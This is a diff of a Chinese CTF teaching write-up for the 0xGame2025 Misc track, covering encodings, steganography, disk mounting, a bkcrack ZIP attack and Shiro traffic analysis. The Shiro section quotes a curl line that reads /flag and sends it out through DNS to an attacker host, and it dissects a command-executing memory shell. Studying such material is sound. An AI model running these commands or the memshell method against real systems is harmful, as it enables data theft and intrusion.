@@ -1,35 +1,39 @@
 ---
 title: 0xGame2025 misc teaching
-link: 0xgame2025-misc
+draft: false
+sticky: false
+catalog: true
+tocNumbering: true
+excludeFromSummary: false
 date: 2026-02-03 21:23:45
-description: 0xGame2025 Misc赛道出题解析与教学指南
+categories:
+  - [CTF]
 tags:
   - 0xGame2025
   - misc
-categories:
-  - ['CTF']
+description: 0xGame2025 Misc赛道出题解析与教学指南
 cover: /img/cover/game.png
+link: 0xgame2025-misc
+updated: 2026-02-10 22:06:28
 ---
-
 # 0xGame2025 misc 赛题解析
-> 0xGame2025 CTF Misc 赛道出题解析与教学指南
-作者：Yo1o
->https://xz.aliyun.com/news/19232
->文章转载自 先知社区
 
-
+> 0xGame2025 CTF Misc 赛道出题解析与教学指南\
+> 作者：Yo1o\
+> <https://xz.aliyun.com/news/19232>\
+> 文章转载自 先知社区
 
 我是 0xGame2025 的部分 Misc 的出题人，下面是针对 misc 方向的授课文案，希望能帮助刚踏上 ctf 路上的学弟学妹们快速入门
 
 > 0xgame2025 所有题目归档传送门如下
 
-- [0xGame2025Week1](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1975497062459904000)
+* [0xGame2025Week1](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1975497062459904000)
 
-- [0xGame2025Week2](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1978130369429377024)
+* [0xGame2025Week2](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1978130369429377024)
 
-- [0xGame2025Week3](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1980644777888059392)
+* [0xGame2025Week3](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1980644777888059392)
 
-- [0xGame2025Week4](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1983791961533845504)
+* [0xGame2025Week4](https://www.ctfplus.cn/learning/problem/excellent-problemSet/detail/1983791961533845504)
 
 ## Week1
 
@@ -44,13 +48,10 @@ ps:我们在飞书上有准备`cyberchef`的离线版本，下载解压后点击
 简单说说工具的使用，请注意，如果这里 output 右侧出现魔法棒，就说明，工具已经检测出字符串的可能编码方式，点击即可
 
 {% note color:red 需要注意，该工具也有可能误判，如果说解密出来的东西不可读或者是别的错误情况，请及时的选择其他法子 %}
-<img src="/img/0xgame2025/image-20250924174928073.png" alt="image-20250924174928073" style="zoom:50%;" />
 
 Recipe 中出现 From base64，同时 output 也大变样，形式上很像我们要提交的 flag
 
-
-
-<img src="/img/0xgame2025/image-20250924175758659.png" alt="image-20250924175758659" style="zoom:50%;" />这里先讲解清楚 Base64 编码原理
+这里先讲解清楚 Base64 编码原理
 
 #### base64 编码原理
 
@@ -62,11 +63,7 @@ Base64 编码是使用范围特别广的一种编码方式，不管是图片，�
 
 下面是将明文 flag 转换成 base64 编码的原理示意图
 
-<img src="/img/0xgame2025/base64convert.jpg" alt="base64convert" style="zoom:50%;" />
-
-
 {% note color:green 这里有个小结论，遇到`Zmxh`别迟疑，说不定就是 flag 的 base64 编码呢？还有昂，这里我一直说的是编码而不是加密，所以注意一个小细节，以后不要说 base64 加密 %}
-
 
 #### 凯撒密码原理
 
@@ -83,8 +80,9 @@ Base64 编码是使用范围特别广的一种编码方式，不管是图片，�
 
 > 加解密公式
 
-- **加密**：`密文字母 = (明文字母位置 + 偏移量) mod 26`
-- **解密**：`明文字母 = (密文字母位置 - 偏移量 + 26) mod 26`
+* **加密**：`密文字母 = (明文字母位置 + 偏移量) mod 26`
+
+* **解密**：`明文字母 = (密文字母位置 - 偏移量 + 26) mod 26`
 
 所以说只要知道密文字母还有**shift**（偏移量）就能快速锁定明文字母
 
@@ -160,39 +158,31 @@ word/
 
 本题中，你们解压后会在`docProps/`目录下看到 gift.xml，而这就是我为你们准备的 flag
 
-<img src="/img/0xgame2025/2025-09-24-22-16-18-image.png" alt="2025-09-24-22-16-18-image" style="zoom:50%;" />
-
 ### ez_shell
 
-> > 注意：本题是 SSH 容器连接题目
->
-> 本题是一道帮助新生接触 Linux 命令的引导题，其他佬可以跳过下面的引导部分，需要提交的 flag 组成如下：
->
-> - `whoami`命令的结果
-> - `pwd`命令的结果
-> - 当前路径下的文件夹名（除去上级路径和当前路径符号
-> - 该文件夹下面的 flag1.txt 文件内容
-> - `/root`下的 flag2.txt 文件内容
->
-> 上述结果需要用'_'连接，然后用 0xGame{}包裹，最终 flag 样例：`0xGame{who_pwd_xxx_xxx_xxx}`
->
-> 会用到的信息：
->
-> - **ssh**连接：`hacker/h@cker_it`
-> - **root**用户：`root/Y0u_@re_root`
+> 注意：本题是 SSH 容器连接题目\
+> 本题是一道帮助新生接触 Linux 命令的引导题，其他佬可以跳过下面的引导部分，需要提交的 flag 组成如下：\
+> 上述结果需要用'_'连接，然后用 0xGame{}包裹，最终 flag 样例：`0xGame{who_pwd_xxx_xxx_xxx}`\
+> 会用到的信息：\
+> \
+> \
+> `whoami`命令的结果\
+> `pwd`命令的结果\
+> 当前路径下的文件夹名（除去上级路径和当前路径符号\
+> 该文件夹下面的 flag1.txt 文件内容\
+> `/root`下的 flag2.txt 文件内容\
+> \
+> \
+> \
+> \
+> **ssh**连接：`hacker/h@cker_it`\
+> **root**用户：`root/Y0u_@re_root`
 
----
+***
 
 如何如何👀？
 
 是第一次接触 shell 吗，解决不了的话，我来教你,这里有个[Linux 命令大全](https://www.linuxcool.com/)，先放这，猜你不会仔细看，好好看看我下面的引导步骤吧，敲黑板昂！！！
-
-<div align="right">
-<img src="/img/0xgame2025/如何？.jpg" alt="如何？" style="width:30%;">
-</div>
-
-
-
 
 #### 引导
 
@@ -204,9 +194,9 @@ word/
 
 常见的 tcp 服务是使用**netcat**这样的工具进行 nc 连接的，但是题目描述中，说到了，这个是 ssh 容器题目，而且给出了连接账密，需要我们通过 ssh 进行远程连接
 
----
+***
 
-- step1 进入 shell
+* step1 进入 shell
 
 在终端中输入:
 
@@ -249,7 +239,7 @@ dep-428f3ef5-705a-4364-a5ee-e59fc8e1fc00-5d4c55ff4b-gpflw:~$
 
 登录后看到类似`hostname:~$` 的字样，就表示我们登录成功，那么恭喜你第一次进入 shell 成功了🥳🥳🥳
 
-- step2 开始答题
+* step2 开始答题
 
 所有 Linux 的基础命令都一样的，详细介绍还是请看我上面放置的网页链接,下面仅仅讲述题目中要用到的命令，也是我们经常用的
 
@@ -300,7 +290,7 @@ yolo@yolo:~/.secret$ pwd
 /home/yolo/.secret
 ```
 
--- cat 
+-- cat
 
 本命令可以读取指定文件的内容，正常来说，推荐用 cat 读取那些小点的，纯文本的文件，比方说 flag.txt 这样的，其他情况下，有其他命令可以用，比如 more,less 等等，自个研究昂
 
@@ -340,21 +330,13 @@ root@yolo:~# cat flag2.txt
 hacker!
 ```
 
-- step3 合成 flag
+* step3 合成 flag
 
 ```plain
 0xGame{yolo_/home/yolo_.secret_congratulation!_hacker!}
 ```
 
-
-
 > 我猜真有人把上面的 flag 交上去了吧，梆梆锤你呢，自个做一遍，熟悉下，然后这里学长给出建议，一定要多用，越学到后面，我们的命令行工具使用的就越多，而且，在终端上操作没有一种黑客体验感吗？多 cool!
-
-<div align="center">
-<img src="/img/0xgame2025/7c3be7774e8d988c5409a15e55949b22.jpg" alt="cool" style="width:30%;">
-</div>
-
-
 
 ### Zootopia
 
@@ -367,8 +349,9 @@ hacker!
 首先有个大概的理解，在 png 图片中，一个像素点在文件数据中存储的大小是三个字节，比较常见的模式是按照 rgb 进行存储的（模式有很多种，但是 rgb 确实是最常见，其他的模式对应的隐写原理和下面的一样
 
 rgb 三个颜色通道的范围都是`[0-255]`
-> 别记岔了！！！
-{: .prompt-warning }
+
+> 别记岔了！！！\
+> {: .prompt-warning }
 
 ```text
 几个常见的颜色
@@ -380,7 +363,7 @@ rgb 三个颜色通道的范围都是`[0-255]`
 
 然后在文件内部，数据是按照 8 位二进制进行存储的，比方说某个像素点的值是(111,222,225)，那么在存储中，对应的值是(01101111,11011110,11100001)
 
-然后这里，我们定义每个 8 位二进制的最后一位为`LSB`  (**Least Significant Bit**,最低有效位)
+然后这里，我们定义每个 8 位二进制的最后一位为`LSB` (**Least Significant Bit**,最低有效位)
 
 所谓的 lsb 隐写就是对每个二进制的最低有效位进行编辑，使用 01 二进制进行隐写信息，可以藏文件，也可以藏字符串，同样，颜色通道的选择也很多样性，可以仅仅对 R 通道进行隐写，也可以选择两个以上……
 
@@ -398,8 +381,6 @@ rgb 三个颜色通道的范围都是`[0-255]`
 
 前者是有可视化界面的提取通道隐写的工具，同样也有对单个颜色通道提取查看图片的功能，还有 xor 等等操作，目前来看，我感觉这个最好用
 
-<img src="/img/0xgame2025/image-20251001160837872.png" alt="image-20251001160837872" style="zoom:50%;" />
-
 先导入图片（你把 png 图片给拉进去也没问题
 
 **Analyse->Data Extract->勾选 Red,Green,Blue 三个通道的最后一位->选中 LSB First(虽说感觉没用)->Preview**
@@ -412,8 +393,6 @@ rgb 三个颜色通道的范围都是`[0-255]`
 
 正常来说，直接`zsteg xxx.png`可以显示大部分可读的颜色通道隐写的部分内容，然后一些情况下，我们可能会发现稍大文件被隐写进去，这时候我们需要使用**-E xxx<通道组合>** 来完整提取隐写数据到文件中
 
-<img src="/img/0xgame2025/image-20251001161738864.png" alt="image-20251001161738864" style="zoom:50%;" />
-
 ```text
 0xGame{W1_Need_t0_t@k3_a_break}
 ```
@@ -421,8 +400,6 @@ rgb 三个颜色通道的范围都是`[0-255]`
 ### ezshell_PLUS
 
 本题是 ezshell 的进阶，就是看看大家的自学能力如何，下面我给出我的步骤
-
-<img src="/img/0xgame2025/image-20251001163833641.png" alt="image-20251001163833641" style="zoom:50%;" />
 
 ```bash
 sha256sum files/* | grep -i "021832def36ccd081b38d8fd51b534d70826b5df4423ce2c15386797ab08bef8"
@@ -449,13 +426,14 @@ do_not_enter.dd: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x10,0,1
 
 从输出可以看出，**do_not_enter.dd**是一个 MBR（主引导记录）格式的磁盘镜像，包含一个引导扇区和三个分区
 
-- 分区 1 和 2 是 Linux 原生分区（类型 0x83)
-- 分区 3 是扩展分区（类型 0x0f),通常用于容纳更多逻辑分区
+* 分区 1 和 2 是 Linux 原生分区（类型 0x83)
+
+* 分区 3 是扩展分区（类型 0x0f),通常用于容纳更多逻辑分区
 
 上面看不懂问题不大，反正和下面的解题过程没多少关系，做多了，就会有更深的体会(●'◡'●)
 
-> 💡 小知识：MBR 是一种较老但广泛支持的分区方案，现代系统更多使用 GPT，但大多数 Linux 工具（如 `fdisk`、`mount`、`losetup` 等）依然能很好地处理 MBR 镜像。
-> 如果你还不熟悉“引导扇区”“分区表”这些概念，没关系！你可以简单把它理解为：**这个 `.dd` 文件就像是把一整块硬盘“拍了张快照”保存下来了**。我们要做的，就是用合适的工具把这个“虚拟硬盘”挂载到系统里，像打开普通文件夹一样去查看里面的内容。
+> 💡 小知识：MBR 是一种较老但广泛支持的分区方案，现代系统更多使用 GPT，但大多数 Linux 工具（如 `fdisk`、`mount`、`losetup` 等）依然能很好地处理 MBR 镜像。\
+> 如果你还不熟悉“引导扇区”“分区表”这些概念，没关系！你可以简单把它理解为：**这个&#x20;**`.dd`**&#x20;文件就像是把一整块硬盘“拍了张快照”保存下来了**。我们要做的，就是用合适的工具把这个“虚拟硬盘”挂载到系统里，像打开普通文件夹一样去查看里面的内容。
 
 #### 做法
 
@@ -467,10 +445,13 @@ sudo losetup -fP do_not_enter.dd
 
 命令解释：
 
-- losetup:linux下的循环设备管理工具，能将文件虚拟成块,换句话说，就是把一个 dd 文件转换成机器磁盘可以读的格式
-- -f:自动查找第一个可用的 loop 设备
-- -P：关键参数！让内核在关联后重新扫描分区表，自动创建分区设备节点
-- 作用：将 DD 镜像文件虚拟成一个”硬盘“，系统会识别出其中的分区结构
+* losetup:linux下的循环设备管理工具，能将文件虚拟成块,换句话说，就是把一个 dd 文件转换成机器磁盘可以读的格式
+
+* -f:自动查找第一个可用的 loop 设备
+
+* -P：关键参数！让内核在关联后重新扫描分区表，自动创建分区设备节点
+
+* 作用：将 DD 镜像文件虚拟成一个”硬盘“，系统会识别出其中的分区结构
 
 **第二步：验证设备映射状态**
 
@@ -480,7 +461,7 @@ sudo losetup -a
 
 命令解释：
 
-- -a:显示所有活跃的 loop 设备状态
+* -a:显示所有活跃的 loop 设备状态
 
 **第三步：识别分区结构与标签**
 
@@ -490,9 +471,11 @@ lsblk -f /dev/loop0 #后面的/dev/loop0是通过第二步得到的
 
 命令解释：
 
-- lsblk:列出块设备信息的专业工具
-- -f:显示文件系统信息，包括分区标签
-- 我的考点其实就是这里，就像题目说的那样，我们应该选中那个 do_not_enter 的标签
+* lsblk:列出块设备信息的专业工具
+
+* -f:显示文件系统信息，包括分区标签
+
+* 我的考点其实就是这里，就像题目说的那样，我们应该选中那个 do_not_enter 的标签
 
 **第四步：挂载目标分区**
 
@@ -503,10 +486,13 @@ sudo mount /dev/loop0p2 /mnt/test
 
 命令解释：
 
-- mount:标准的文件系统挂载命令
-- /dev/loop0p2:我们要挂载的分区设备 #这里的参数是通过第三步得到的
-- /mnt/test：我们设置的挂载点目录
-- 底层原理：将分区中的 ext4 文件系统挂载到目录树，使文件可访问
+* mount:标准的文件系统挂载命令
+
+* /dev/loop0p2:我们要挂载的分区设备 #这里的参数是通过第三步得到的
+
+* /mnt/test：我们设置的挂载点目录
+
+* 底层原理：将分区中的 ext4 文件系统挂载到目录树，使文件可访问
 
 **第五步：搜索 flag 内容**
 
@@ -516,9 +502,11 @@ sudo grep -r "0xGame" /mnt/test
 
 命令解释：
 
-- grep:强大的文本搜索工具
-- -r:递归搜索，遍历目录下的所有文件
-- "0xGame":flag头
+* grep:强大的文本搜索工具
+
+* -r:递归搜索，遍历目录下的所有文件
+
+* "0xGame":flag头
 
 **第六步：清理**
 
@@ -532,13 +520,13 @@ sudo rmdir /mnt/test
 
 然后关于**blkid**，也能用它来读取那个分区的标签，在某些情况下，它可以和**lsblk**换着用
 
-| 特性         | **`blkid`**                         | **`lsblk`**                      |
-| ------------ | ----------------------------------- | -------------------------------- |
-| **主要功能** | 读取**文件系统**的元数据和属性      | 显示**块设备**的拓扑结构和关系   |
-| **数据来源** | 读取文件系统的超级块(superblock)    | 查询内核的块设备信息(sysfs)      |
-| **输出视角** | **文件系统视角**                    | **设备拓扑视角**                 |
+| 特性       | `blkid`                     | `lsblk`           |
+| -------- | --------------------------- | ----------------- |
+| **主要功能** | 读取**文件系统**的元数据和属性           | 显示**块设备**的拓扑结构和关系 |
+| **数据来源** | 读取文件系统的超级块(superblock)      | 查询内核的块设备信息(sysfs) |
+| **输出视角** | **文件系统视角**                  | **设备拓扑视角**        |
 | **信息类型** | 文件系统特定属性(UUID, LABEL, TYPE) | 设备层次关系(父子、大小、挂载点) |
-| **使用场景** | 按属性识别和挂载文件系统            | 理解磁盘分区结构和布局           |
+| **使用场景** | 按属性识别和挂载文件系统                | 理解磁盘分区结构和布局       |
 
 然后下面是我给出的参考步骤，可以看出在正确步骤下，我们只能找到一个完完整整的 flag 的，fake flag 真的一点也没为难大家的（盲猜有人说我胡乱塞东西，哈哈
 
@@ -562,21 +550,13 @@ loop0
 ~$ sudo rmdir /mnt/test
 ```
 
-<img src="/img/0xgame2025/image-20251002010301159.png" alt="image-20251002010301159" style="zoom:50%;" />
-
 一些其他工具（Windows，本意还是让大家掌握 dd 镜像挂载方式，但是赖我，没有给大家说清楚，应该关注分区标签，为各位师傅解题时候造成困扰感到抱歉
 
-- AXIOM
+* AXIOM
 
-<img src="/img/0xgame2025/image-20251009225550160.png" alt="image-20251009225550160" style="zoom:50%;" />
+* DiskGenius
 
-- DiskGenius
-
-<img src="/img/0xgame2025/image-20251009225621434.png" alt="image-20251009225621434" style="zoom:50%;" />
-
-- R-Studio
-
-<img src="/img/0xgame2025/image-20251009225641928.png" alt="image-20251009225641928" style="zoom:50%;" />
+* R-Studio
 
 #### 学长碎碎念
 
@@ -594,21 +574,17 @@ loop0
 
 ### 这个 b64 不太对啊
 
+> 小拓展\
+> {: .prompt-success }
 
-> 小拓展
-{: .prompt-success }
-
-
-> 交互出现的中文乱码对解题没有任何影响，但是为了解题体验，可以选择下述方式优化：
-优先建议使用 Linux 的终端，wsl2,虚拟机均可，它们支持 utf-8
-如果是使用 cmd，请 nc 连接容器之前，输入`chcp 65001`回车，将编码方式从 gbk 切换成 utf-8 后再 nc 连接
-如果说是 powershell，这个稍微麻烦点
-需要实现操作如下：依次将下面三个命令输入到 powershell 中
-> `chcp 65001`
-> `[Console]::InputEncoding = [System.Text.Encoding]::UTF8`
+> 交互出现的中文乱码对解题没有任何影响，但是为了解题体验，可以选择下述方式优化：\
+> 优先建议使用 Linux 的终端，wsl2,虚拟机均可，它们支持 utf-8\
+> 如果是使用 cmd，请 nc 连接容器之前，输入`chcp 65001`回车，将编码方式从 gbk 切换成 utf-8 后再 nc 连接\
+> 如果说是 powershell，这个稍微麻烦点\
+> 需要实现操作如下：依次将下面三个命令输入到 powershell 中\
+> `chcp 65001`\
+> `[Console]::InputEncoding = [System.Text.Encoding]::UTF8`\
 > `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8`
-
-
 
 > 本题可以变相的看作一道密码简单题，既然想学 misc，各个方向都要有所了解
 
@@ -657,7 +633,7 @@ A(65),/(47)
 
 我这里稍微归纳整理了下，使用第 3 个字母的 ASCII 值直接对 64 进行取余运算，拿到的值就是第 4 个密文的索引值，其中的数学原理和上面举的例子（取低 6 位）是一样的，比如说 A(65)，对 64 进行取余的结果是 1，然后/(47)，对 64 取余是 47，计算结果完全是低 6 位转换十进制的结果
 
-*脚本的核心原理：**Base64 编码后第 4 个字符的索引值，等于第 3 个输入字节的低 6 位（即 `byte3 % 64`）**。*
+*脚本的核心原理：****Base64 编码后第 4 个字符的索引值，等于第 3 个输入字节的低 6 位（即&#x20;***`byte3 % 64`***）****。*
 
 ```python
 import base64
@@ -767,24 +743,23 @@ if __name__ == "__main__":
 
 我们会用到的部分知识是 png 有固定的魔数头：`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`
 
-<img src="/img/0xgame2025/20251013231154_006.webp" alt="image-20251007130940004" style="zoom:50%;" />
-
 可以说，所有正常的 png 文件头，前面这 16 字节一定是一样的，分别是文件魔数标志以及 IHDR 数据块的名称，大家可以自己动手看看
 
 接下来说说明文攻击实现的利用方法
 
-> 关于明文攻击的实现原理，可以参考这位佬的博客文章https://flandre-scarlet.moe/blog/1685/
+> 关于明文攻击的实现原理，可以参考这位佬的博客文章<https://flandre-scarlet.moe/blog/1685/>
 
 简单说明，实现 zip 明文攻击的前提分别是：
 
-- 压缩包的压缩方式必须是 ZipCrypto 加密（deflate 或 Store 模式均可）
-- 必须已知 8 字节的连续明文和对应偏移，进行恢复密钥，然后还需要 4 字节明文参与密钥验证，4 字节明文可以与 8 字节明文不连续，明文知道越多，解密速度越快
+* 压缩包的压缩方式必须是 ZipCrypto 加密（deflate 或 Store 模式均可）
+
+* 必须已知 8 字节的连续明文和对应偏移，进行恢复密钥，然后还需要 4 字节明文参与密钥验证，4 字节明文可以与 8 字节明文不连续，明文知道越多，解密速度越快
 
 正常而言，我们使用 bkcrack 工具进行明文攻击居多
 
 #### how to solve
 
-- step 1
+* step 1
 
 我们先使用-L 查看压缩包的详细信息，发现它们是 ZipCrypto 加密方式的 Store 压缩模式，然后观察到里面就两个文件，其中一个就是我们需要利用的 png
 
@@ -798,7 +773,7 @@ Index Encryption Compression CRC32    Uncompressed  Packed size Name
     1 ZipCrypto  Store       04a6dc2d     10149855     10149867 huiliyi.png
 ```
 
-- step 2
+* step 2
 
 接下来我们需要想办法创造 bkcrack 可以利用的明文（显然不能用上面你们直接看到的 8950 啊，这个是给我们看的，但是给 bkcrack 看的话，就要用源数据处理
 
@@ -810,7 +785,7 @@ $ cat pngheader
 IHDR
 ```
 
-- step 3
+* step 3
 
 接下来是直接开始明文攻击，简单说明，-C 指定的是加密压缩包，-c 指定了我们明文攻击利用的文件（我们已知部分明文的文件），-p 指定的是我们要利用的明文
 
@@ -830,7 +805,7 @@ You may resume the attack with the option: --continue-attack 181808
 cdc564be 5675041f 719adb56
 ```
 
-- step 4
+* step 4
 
 接下来就是拿第三步得到的 keys 进行解密，读取 flag，有多种方式
 
@@ -863,21 +838,13 @@ bkcrack -C attachment.zip -k cdc564be 5675041f 719adb56 -c flag.txt -d flag.txt 
 
 因为.git 文件夹里面的数据存储是 zilb 压缩，所以也不涉及解密什么的操作,给出一个解密照片
 
-<img src="/img/0xgame2025/20251013231154_007.webp" alt="image-20251013212734416" style="zoom:50%;" />
-
-但是为了更加方便快捷，直接按照仓库更新进行文件恢复，挺建议使用工具 GitTools,项目地址https://github.com/internetwache/GitTools
-
-<img src="/img/0xgame2025/20251013231154_008.webp" alt="image-20251007160318175" style="zoom:50%;" />
+但是为了更加方便快捷，直接按照仓库更新进行文件恢复，挺建议使用工具 GitTools,项目地址<https://github.com/internetwache/GitTools>
 
 Look here，发现前后只有两次更新仓库
 
 直接锁定 main.py
 
-<img src="/img/0xgame2025/20251013231154_009.webp" alt="image-20251007160427444" style="zoom:50%;" />
-
 这里就是考察了下大家的代码审计能力，很轻松的，先进行凯撒加密，然后进行 xor 异或，最后是 base64 编码，我们解密的时候只需要倒过来操作即可
-
-<img src="/img/0xgame2025/20251013231154_010.webp" alt="image-20251007162040142" style="zoom: 33%;" />
 
 ```python
 #经供参考
@@ -922,17 +889,13 @@ if __name__=="__main__":
 
 下次遇到流量分析中出现 rememberMe 的时候，应当想到 shiro 加密流量，下面我仅仅讲述解题步骤
 
-推荐在线工具https://potato.gold/navbar/tool/shiro/ShiroTool.html
+推荐在线工具<https://potato.gold/navbar/tool/shiro/ShiroTool.html>
 
 *原理我会在最下面简单讲讲*
 
 首先追踪第一个 http 流
 
-<img src="/img/0xgame2025/20251013231155_011.webp" alt="image-20251007213345141" style="zoom:50%;" />
-
 会看到很长的请求包
-
-<img src="/img/0xgame2025/20251013231155_012.webp" alt="image-20251007213849145" style="zoom:50%;" />
 
 将对应的 Cookie 复制到在线工具中，然后输入密钥`kPH+bIxk5D2deZiIxcaaaA==`（这是一种约定俗成或者说是默认的密钥，下次遇到这类题，如果密钥不对，那么可能考察的是密钥爆破，具体的问题可以自行研究
 
@@ -1036,15 +999,19 @@ public class Test422640791304000 extends AbstractTranslet
 
 **Header 检测:**
 
-- 代码尝试获取 **`Host`** 头部，如果存在，则返回 `200` 状态码和 `Host` 头部，作为**连通性/身份验证**的信号。
-- 代码尝试获取 **`Authorization`** 头部。
+* 代码尝试获取 `Host` 头部，如果存在，则返回 `200` 状态码和 `Host` 头部，作为**连通性/身份验证**的信号。
+
+* 代码尝试获取 `Authorization` 头部。
 
 **命令执行:**
 
-- `Base64.decodeToString(s2.replaceAll("Basic ", ""))`: 对 `Authorization` 头部的值进行 **Base64 解码**，这个解码后的字符串就是攻击者想要执行的**操作系统命令**。
-- `new ProcessBuilder(...) .start()`: 根据操作系统（Windows 使用 `cmd.exe /c`，其他使用 `/bin/sh -c`），执行解码后的命令。
-- **回显 (`writeBody`):** 命令执行的结果（`InputStream`）被读取，然后通过 **`writeBody`** 方法写入到 HTTP **响应体**中。
-  - `writeBody` 通过反射调用容器的内部方法 (`doWrite`)，将结果用 `$$$...$$$` 封装后 **Base64 编码**发送回攻击者。
+* `Base64.decodeToString(s2.replaceAll("Basic ", ""))`: 对 `Authorization` 头部的值进行 **Base64 解码**，这个解码后的字符串就是攻击者想要执行的**操作系统命令**。
+
+* `new ProcessBuilder(...) .start()`: 根据操作系统（Windows 使用 `cmd.exe /c`，其他使用 `/bin/sh -c`），执行解码后的命令。
+
+* **回显 (**`writeBody`**):** 命令执行的结果（`InputStream`）被读取，然后通过 `writeBody` 方法写入到 HTTP **响应体**中。
+
+  * `writeBody` 通过反射调用容器的内部方法 (`doWrite`)，将结果用 `$$$...$$$` 封装后 **Base64 编码**发送回攻击者。
 
 说简单点，就是 hacker 的命令会在 Authorization 部分，然后回显会用$$$...$$$包裹，里面的重要信息全用 base64 编码
 
@@ -1071,15 +1038,11 @@ curl $(cat /flag | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 | tr -d '\n').attac
 
 这是因为在流量抓包中，流量协议会将访问某个子域名的流量定义为 dns 流量，就是说服务器访问域名的时候，需要先本地进行 dns 解析，然后才能进行后续的交互，hacker 就是利用这一点，将密文给用 dns 流量传递出来了
 
-<img src="/img/0xgame2025/20251013231155_013.webp" alt="image-20251007221525697" style="zoom:50%;" />
-
 ```plain
 fTBlMXVGX2dmaFd7cnpuVGswCg==
 ```
 
 解密脚本
-
-<img src="/img/0xgame2025/20251013231156_014.webp" alt="image-20251007222539796" style="zoom:50%;" />
 
 有个更轻松的方法
 
@@ -1099,9 +1062,12 @@ $ echo fTBlMXVGX2dmaFd7cnpuVGswCg== | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | r
 当用户勾选“记住我”登录时，Shiro 会执行以下操作：
 
 1. 将用户的身份信息（一个实现了 `Serializable` 接口的对象，如 `Principal`）进行 **Java 序列化**。
+
 2. 对序列化后的数据进行 **AES 加密**。
+
 3. 对密文进行 **Base64 编码**。
-4. 将最终的 Base64 字符串作为 **`rememberMe` Cookie** 的值发送给客户端。
+
+4. 将最终的 Base64 字符串作为 `rememberMe`**&#x20;Cookie** 的值发送给客户端。
 
 当客户端带着这个 `rememberMe` Cookie 访问服务器时，服务器会执行逆向操作：**Base64 解码 → AES 解密 → Java 反序列化**。
 
@@ -1204,11 +1170,10 @@ decrypted_result.bin: Java serialization data, version 5
 
 可以看出，这是 Java 序列化文件，是个二进制文件，不好分析，我们只能先通过反序列化处理，但是也就是这一点最难
 
-> 可惜我还没学会这种文件的分析处理~~（在学了，在学了~~
->
+> 可惜我还没学会这种文件的分析处理~~（在学了，在学了~~\
 > ~~所以还是回到那个在线解密工具吧~~
 
-~~在线 shiro 解密工具https://potato.gold/navbar/tool/shiro/ShiroTool.html~~
+~~在线 shiro 解密工具~~~~<https://potato.gold/navbar/tool/shiro/ShiroTool.html>~~
 
 学会咯，感谢 spreng，他教会我怎么处理一个 Java 序列化文件
 
@@ -1254,9 +1219,7 @@ java -jar cfr.jar shiro_payload_output.class > output.java
 
 反编译出来的结果很清晰
 
-![image-20251008113818934](/img/0xgame2025/20251013231153_003.webp)
-
-![image-20251008113835006](/img/0xgame2025/20251013231153_004.webp)
+![image-20251008113818934](/img/0xgame2025/20251013231153_003.webp)![image-20251008113835006](/img/0xgame2025/20251013231153_004.webp)
 
 一些必要的细节都有
 
@@ -1270,20 +1233,17 @@ java -jar cfr.jar shiro_payload_output.class > output.java
 
 #### 图片宽高更改
 
-- png
-- - 首先用 010 锁定 ihdr 块，然后手动编辑，width 对应的宽度，height 对应的高度，更改数字即可
+* png
 
-<img src="/img/0xgame2025/20251013231156_015.webp" alt="image-20251008000130599" style="zoom:50%;" />
+* * 首先用 010 锁定 ihdr 块，然后手动编辑，width 对应的宽度，height 对应的高度，更改数字即可
 
-- jpg
-- - 用 010 锁定 sof0 数据块，图片的宽高在这里控制，同样直接更改数字，然后保存即可
+* jpg
 
-<img src="/img/0xgame2025/20251013231156_016.webp" alt="image-20251008000417847" style="zoom:50%;" />
+* * 用 010 锁定 sof0 数据块，图片的宽高在这里控制，同样直接更改数字，然后保存即可
 
-- gif
-- - 用 010 查看 LogicalScreenDescriptor，下面的 Width 和 Height 控制的就是宽高
+* gif
 
-<img src="/img/0xgame2025/20251013231156_017.webp" alt="image-20251008000700068" style="zoom:50%;" />
+* * 用 010 查看 LogicalScreenDescriptor，下面的 Width 和 Height 控制的就是宽高
 
 > 上面的三种宽高更改，某种意义上，其实并不一样，比方说 png 改变宽高，仅仅是对应的画面消失，然而其他部分没有改变，jpg 的话，一旦更改宽高，哪怕很细微，对图片的损伤也很大，里面的原由，希望大家能在学习对应的文件结构时，留意下细节，比如说 png 是一种流加密存储……
 
@@ -1300,8 +1260,6 @@ exiftool -Make="Hacker" \
 ```
 
 再将宽高更改后，提交就能拿到 flag
-
-<img src="/img/0xgame2025/20251013231156_018.webp" alt="image-20251008002544489" style="zoom:50%;" />
 
 ### ezChain
 
@@ -1321,8 +1279,6 @@ exiftool -Make="Hacker" \
 
 > 下面举例用这个环境进行
 
-<img src="/img/0xgame2025/20251013231157_019.webp" alt="image-20251008004607202" style="zoom:33%;" />
-
 ```python
 RPC_URL = "http://47.122.65.230:48334/65a7edf6-c415-4105-a26b-36f70f7913e6"
 PRIVKEY = "fa7d264c487617dc552c2f0186111d321fc380762673e2ea6ce4973205ee9992"
@@ -1330,7 +1286,7 @@ SETUP_CONTRACT_ADDR = "0x074688F8E6f147502450B36f5eAa7CC3c3BAbA35"
 WALLET_ADDR = "0x75248DebE8531030d4CDe342A5eBE8E7De5F4778"
 ```
 
-- 一些准备
+* 一些准备
 
 首先需要在浏览器上安装**`metamask`**插件，几乎每家浏览器都有这个的
 
@@ -1338,49 +1294,31 @@ WALLET_ADDR = "0x75248DebE8531030d4CDe342A5eBE8E7De5F4778"
 
 接下来就是注册，创建新钱包，这些不做截图
 
-- 配置 rpc
+* 配置 rpc
 
 第一次登录，会自动连接以太主网，有两个方式：
 
-- - 使用魔法
-
-<img src="/img/0xgame2025/20251013231157_020.webp" alt="image-20251008004207827" style="zoom: 25%;" />
+* * 使用魔法
 
 点击左上角的 Ethereum Mainnet,会进入选择网络的功能，选择添加自定义网络
 
-- - 等待一会儿
+* * 等待一会儿
 
 出现切换网络.jpg(没截图)
 
 点击后，弹窗样子和上面的那个图片是一样的
 
-<img src="/img/0xgame2025/20251013231157_021.webp" alt="image-20251008004542515" style="zoom:50%;" />
-
